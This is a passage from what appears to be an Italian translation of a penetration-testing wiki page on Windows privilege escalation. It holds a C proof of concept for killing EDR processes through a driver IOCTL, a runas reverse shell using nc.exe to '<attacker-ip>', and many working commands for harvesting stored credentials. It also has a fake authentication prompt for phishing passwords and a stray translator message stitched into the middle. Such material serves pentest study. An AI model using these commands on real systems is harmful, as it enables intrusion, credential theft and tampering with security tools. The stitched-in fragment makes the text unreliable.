{{#endref}}

#### Registry hive memory corruption primitives

Le moderne vulnerabilità degli hive consentono di predisporre layout deterministici, abusare di discendenti HKLM/HKU scrivibili e convertire la corruzione dei metadati in overflow del kernel paged-pool senza un driver custom. Scopri la catena completa qui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Alcuni driver di terze parti firmati creano il loro device object con un SDDL robusto via IoCreateDeviceSecure ma dimenticano di impostare FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Senza questo flag, il secure DACL non viene applicato quando il device viene aperto attraverso un percorso contenente un componente extra, permettendo a qualsiasi utente non privilegiato di ottenere un handle usando un namespace path come:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

Una volta che un utente può aprire il device, gli IOCTL privilegiati esposti dal driver possono essere abusati per LPE e tampering. Esempi di capacità osservate in the wild:
- Restituire handle con accesso completo a processi arbitrari (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lettura/scrittura raw del disco senza restrizioni (offline tampering, boot-time persistence tricks).
- Terminare processi arbitrari, inclusi Protected Process/Light (PP/PPL), consentendo kill di AV/EDR da user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Impostare sempre FILE_DEVICE_SECURE_OPEN quando si creano device objects destinati a essere limitati da una DACL.
- Validare il contesto del caller per le operazioni privilegiate. Aggiungere controlli PP/PPL prima di consentire la terminazione di processi o il ritorno di handle.
- Limitare gli IOCTLs (access masks, METHOD_*, input validation) e considerare modelli brokered invece di privilegi diretti nel kernel.

Detection ideas for defenders
- Monitorare gli user-mode opens di nomi di device sospetti (e.g., \\ .\\amsdk*) e sequenze IOCTL specifiche indicative di abuso.
- Applicare la vulnerable driver blocklist di Microsoft (HVCI/WDAC/Smart App Control) e mantenere le proprie allow/deny lists.


## PATH DLL Hijacking

Se hai **write permissions inside a folder present on PATH** potresti essere in grado di hijack a DLL caricata da un processo e **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Per maggiori informazioni su come sfruttare questo controllo:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Rete

### Condivisioni
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### file hosts

Verifica la presenza di altri computer noti hardcoded nel file hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfacce di rete & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Porte aperte

Verifica la presenza di **servizi limitati** dall'esterno
```bash
netstat -ano #Opened ports?
```
### Tabella di routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabella ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regole del Firewall

[**Consulta questa pagina per i comandi relativi al Firewall**](../basic-cmd-for-pentesters.md#firewall) **(elenca regole, crea regole, disattiva, disattiva...)**

Altri[ comandi per l'enumerazione della rete qui](../basic-cmd-for-pentesters.md#network)

### Sottosistema Windows per Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Il binario `bash.exe` può essere trovato anche in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se ottieni l'utente root puoi ascoltare su qualsiasi porta (la prima volta che usi `nc.exe` per ascoltare su una porta ti chiederà via GUI se `nc` dovrebbe essere consentito dal firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il filesystem `WSL` nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenziali di Windows

### Credenziali di Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestore credenziali / Windows vault

Da [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault memorizza le credenziali utente per server, siti web e altri programmi per i quali **Windows** può **eseguire automaticamente il login degli utenti**. A prima vista, potrebbe sembrare che gli utenti possano memorizzare le loro credenziali di Facebook, Twitter, Gmail ecc., in modo da effettuare automaticamente l'accesso tramite i browser. Ma non è così.

Windows Vault memorizza credenziali che **Windows** può usare per accedere automaticamente agli utenti, il che significa che qualsiasi **applicazione Windows che necessita di credenziali per accedere a una risorsa** (server o un sito web) **può utilizzare questo Credential Manager** & Windows Vault e usare le credenziali fornite invece che gli utenti inseriscano nome utente e password ogni volta.

A meno che le applicazioni non interagiscano con il Credential Manager, non credo sia possibile per loro usare le credenziali per una data risorsa. Quindi, se la tua applicazione vuole sfruttare il vault, dovrebbe in qualche modo **comunicare con il credential manager e richiedere le credenziali per quella risorsa** dal vault di archiviazione predefinito.

Usa il `cmdkey` per elencare le credenziali memorizzate sulla macchina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Quindi puoi usare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. L'esempio seguente chiama un binario remoto tramite una condivisione SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Uso di `runas` con un set di credenziali fornite.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o dal [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La Data Protection API (DPAPI) fornisce un metodo per la crittografia simmetrica dei dati, usata principalmente all'interno del sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto dell'utente o del sistema per contribuire in modo significativo all'entropia.

DPAPI permette la crittografia delle chiavi tramite una chiave simmetrica derivata dai segreti di login dell'utente. In scenari con crittografia di sistema, utilizza i segreti di autenticazione di dominio del sistema.

Le chiavi RSA utente crittografate tramite DPAPI sono memorizzate nella directory %APPDATA%\Microsoft\Protect\{SID}, dove {SID} rappresenta lo [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. La chiave DPAPI, co-locata con la master key che protegge le chiavi private dell'utente nello stesso file, è tipicamente costituita da 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è ristretto, impedendo di elencarne il contenuto tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puoi usare il **mimikatz module** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decrittarlo.

I **file delle credenziali protetti dalla master password** si trovano solitamente in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puoi usare **mimikatz module** `dpapi::cred` con il `/masterkey` appropriato per decriptare.\
Puoi **estrarre molte DPAPI** **masterkeys** dalla **memoria** con il modulo `sekurlsa::dpapi` (se sei root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenziali PowerShell

Le **credenziali PowerShell** sono spesso usate per attività di **scripting** e automazione come modo conveniente per memorizzare credenziali criptate. Le credenziali sono protette usando **DPAPI**, il che in genere significa che possono essere decriptate solo dallo stesso utente sullo stesso computer in cui sono state create.

Per **decriptare** una credenziale PS dal file che la contiene puoi fare:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connessioni RDP Salvate

Puoi trovarle in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandi eseguiti di recente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestore credenziali Desktop remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa il **Mimikatz** `dpapi::rdg` modulo con l'appropriato `/masterkey` per **decriptare qualsiasi file .rdg**\
Puoi **estrarre molte DPAPI masterkeys** dalla memoria con il modulo Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Spesso gli utenti usano l'app StickyNotes sulle workstation Windows per **salvare password** e altre informazioni, senza rendersi conto che è un file di database. Questo file si trova in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ed è sempre utile cercarlo ed esaminarlo.

### AppCmd.exe

**Nota che per recuperare password da AppCmd.exe è necessario essere Administrator ed eseguire con High Integrity level.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\`.\
Se questo file esiste, è possibile che alcune **credentials** siano state configurate e possano essere **recuperate**.

Questo codice è stato estratto da [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifica se `C:\Windows\CCM\SCClient.exe` esiste .\
Gli installer vengono eseguiti con privilegi SYSTEM, molti sono vulnerabili a **DLL Sideloading (Info da** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## File e Registro (Credenziali)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chiavi host SSH di Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chiavi SSH nel registro

Le chiavi private SSH possono essere memorizzate nella chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti controllare se c'è qualcosa di interessante al suo interno:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi qualche voce all'interno di quel percorso sarà probabilmente una SSH key salvata. È memorizzata crittografata ma può essere facilmente decriptata usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maggiori informazioni su questa tecnica qui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se il servizio `ssh-agent` non è in esecuzione e vuoi che venga avviato automaticamente all'avvio esegui:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Sembra che questa tecnica non sia più valida. Ho provato a creare alcune ssh keys, aggiungerle con `ssh-add` e fare login via ssh su una macchina. Il registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha individuato l'uso di `dpapi.dll` durante l'autenticazione con chiave asimmetrica.

### File non presidiati
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Puoi anche cercare questi file usando **metasploit**: _post/windows/gather/enum_unattend_

Esempio di contenuto:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backup di SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenziali Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Cached GPP Pasword

Una funzionalità era disponibile in passato che consentiva il deployment di account amministratore locale personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava gravi vulnerabilità di sicurezza. In primo luogo, i Group Policy Objects (GPOs), memorizzati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente di dominio. In secondo luogo, le password contenute in questi GPP, criptate con AES256 usando una chiave di default pubblicamente documentata, potevano essere decriptate da qualsiasi utente autenticato. Ciò rappresentava un rischio serio, poiché poteva permettere l'escalation di privilegi.

Per mitigare questo rischio, è stata sviluppata una funzione per cercare file GPP memorizzati localmente che contengono un campo "cpassword" non vuoto. Una volta trovato un tale file, la funzione decifra la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, facilitando l'identificazione e la correzione di questa vulnerabilità di sicurezza.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Per decifrare la cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usare crackmapexec per ottenere le password:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configurazione Web IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Esempio di web.config con credenziali:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenziali OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Chiedere le credentials

Puoi sempre **chiedere allo user di inserire le sue credentials o anche le credentials di un altro user** se pensi che possa conoscerle (nota che **chiedere** direttamente al client le **credentials** è veramente **rischioso**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possibili nomi di file contenenti credentials**

File noti che in passato contenevano **passwords** in **clear-text** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Non ho ricevuto il contenuto del file src/windows-hardening/windows-local-privilege-escalation/README.md. Per favore incolla il contenuto del file (o conferma i file da cercare) e procederò a tradurre il testo rilevante in italiano mantenendo intatta la sintassi markdown/HTML e i tag/percorsi non traducibili.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenziali nel RecycleBin

Dovresti anche controllare il Bin per cercare credenziali al suo interno

Per **recuperare le password** salvate da diversi programmi puoi usare: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### All'interno del registro

**Altre possibili chiavi di registro con credenziali**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Cronologia dei browser

Dovresti cercare i database dove sono memorizzate le password di **Chrome o Firefox**.\
Controlla anche la cronologia, i segnalibri e i preferiti dei browser perché magari alcune **password sono** memorizzate lì.

Strumenti per estrarre le password dai browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) è una tecnologia integrata nel sistema operativo Windows che permette l'intercomunicazione tra componenti software scritti in linguaggi diversi. Ogni componente COM è identificato tramite un class ID (CLSID) e ogni componente espone funzionalità tramite una o più interfacce, identificate tramite interface IDs (IIDs).

Le classi e le interfacce COM sono definite nel registry sotto **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface** rispettivamente. Questo hive del registry viene creato unendo **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

All'interno dei CLSID in questo hive puoi trovare la sottochiave **InProcServer32**, che contiene un **default value** che punta a una **DLL** e un valore chiamato **ThreadingModel** che può essere **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) o **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Fondamentalmente, se puoi **sovrascrivere una qualsiasi delle DLL** che verranno eseguite, potresti ottenere **escalate privileges** se quella DLL viene eseguita da un altro utente.

Per capire come attackers usano COM Hijacking come meccanismo di persistence, controlla:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ricerca generica di password nei file e nel registry**

Cerca il contenuto dei file
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Cerca un file con un determinato nome**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Cerca nel registro i nomi delle chiavi e le password**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Strumenti che cercano password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **è un plugin per msf** che ho creato per **eseguire automaticamente ogni metasploit POST module che cerca credentials** all'interno della vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file contenenti password menzionati in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo tool per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessions**, **usernames** e **passwords** di diversi tool che salvano questi dati in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Immagina che **un processo in esecuzione come SYSTEM open a new process** (`OpenProcess()`) con **full access**. Lo stesso processo **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Quindi, se hai **full access to the low privileged process**, puoi afferrare l'**open handle to the privileged process created** con `OpenProcess()` e **inject a shellcode**.\
[Leggi questo esempio per maggiori informazioni su **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Leggi questo **altro post per una spiegazione più completa su come testare e abusare di più open handlers di processi e thread ereditati con diversi livelli di permessi (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, indicati come **pipes**, consentono la comunicazione tra processi e il trasferimento di dati.

Windows offre una funzionalità chiamata **Named Pipes**, che permette a processi non correlati di condividere dati, anche su reti diverse. Questo somiglia a un'architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

